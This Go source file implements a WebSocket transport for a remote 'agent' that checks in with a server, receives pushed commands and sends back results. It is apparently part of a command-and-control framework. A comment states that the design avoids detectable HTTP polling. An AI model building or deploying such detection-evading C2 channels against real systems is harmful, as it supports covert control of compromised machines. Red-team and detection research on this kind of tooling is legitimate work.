package transport

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// wsEnvelope mirrors the server-side envelope for WebSocket message framing.
type wsEnvelope struct {
	Type  string          `json:"type"`
	ID    string          `json:"id,omitempty"`
	Data  json.RawMessage `json:"data,omitempty"`
	Error string          `json:"error,omitempty"`
}

// WSClient implements a persistent WebSocket transport for agent beaconing.
// The server pushes commands over the open connection, eliminating the polling
// pattern that is detectable in HTTP-based transports.
type WSClient struct {
	serverURL string
	agentID   string

	mu        sync.Mutex
	conn      *websocket.Conn

	cmdCh     chan []byte // buffered channel of raw command payloads pushed by server
	checkedIn bool       // first SendData → "checkin", subsequent → "result"
}

// NewWSClient dials the WebSocket endpoint and starts the read loop.
func NewWSClient(serverURL, agentID string) (*WSClient, error) {
	c := &WSClient{
		serverURL: serverURL,
		agentID:   agentID,
		cmdCh:     make(chan []byte, 16),
	}
	if err := c.connect(); err != nil {
		return nil, err
	}
	return c, nil
}

func (c *WSClient) connect() error {
	conn, _, err := websocket.DefaultDialer.Dial(c.serverURL, nil)
	if err != nil {
		return fmt.Errorf("ws dial %s: %w", c.serverURL, err)
	}
	c.conn = conn
	go c.readLoop()
	return nil
}

// readLoop processes messages pushed from the server.
// On disconnect it attempts to reconnect after a brief delay.
func (c *WSClient) readLoop() {
	for {
		_, raw, err := c.conn.ReadMessage()
		if err != nil {
			time.Sleep(5 * time.Second)
			c.mu.Lock()
			c.checkedIn = false
			_ = c.connect()
			c.mu.Unlock()
			return
		}

		var env wsEnvelope
		if err := json.Unmarshal(raw, &env); err != nil {
			continue
		}
		switch env.Type {
		case "command":
			select {
			case c.cmdCh <- []byte(env.Data):
			default:
				// Buffer full — discard. pushLoop on server will retry.
			}
		case "noop", "error":
			// nothing
		}
	}
}

// SendData sends payload to the server.
// The first call is treated as a checkin; subsequent calls are results.
func (c *WSClient) SendData(payload []byte) error {
	c.mu.Lock()
	defer c.mu.Unlock()

	msgType := "result"
	if !c.checkedIn {
		msgType = "checkin"
		c.checkedIn = true
	}
	env := wsEnvelope{
		Type: msgType,
		ID:   c.agentID,
		Data: json.RawMessage(payload),
	}
	return c.conn.WriteJSON(env)
}

// PollCommand blocks until the server pushes a command and returns the raw payload.
func (c *WSClient) PollCommand() ([]byte, error) {
	data := <-c.cmdCh
	return data, nil
}
